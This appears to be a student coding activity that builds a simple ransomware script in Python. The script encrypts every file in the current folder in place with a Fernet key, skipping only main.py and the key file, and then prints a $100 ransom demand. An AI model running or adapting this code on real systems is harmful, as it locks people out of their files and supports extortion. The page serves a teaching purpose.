Encrypt the File Data
======================
In this activity, you will code to encrypt the files except the main.py or encryptedKey.key file.


<img src= "https://s3-whjr-curriculum-uploads.whjr.online/f50b92bd-501c-43cb-9398-fc0407a391e7.gif" width = "auto" height = "auto">




Follow the given steps to complete this activity.




1. Encrypt the File Data
* Open the file main.py.
* Loop through each path in the current folder and if the path is not of `main.py` and `encryptedKey.key` then add that file path to list `files`
```
for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key"):
        continue
    if os.path.isfile(path):
        files.append(path)
```
.
* Add a `for` each loop that iterates through each file path in the `files` list to open the file and store its content.
```
for file in files:
    with open(file, "rb") as file1:
        rawData = file1.read()
```
* Encrypt the data read from the file using the Fernet key.
```
    encryptedRawData
    encryptedRawData = Fernet(key).encrypt(rawData)
```
* Save the encrypted data back in the same file.
```
    with open(file, "wb") as file2:
        file2.write(encryptedRawData)
```


* Notify the user on files being locked and can be accessible only on payment.
```
print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")


```


* Save and run the code to check the output.
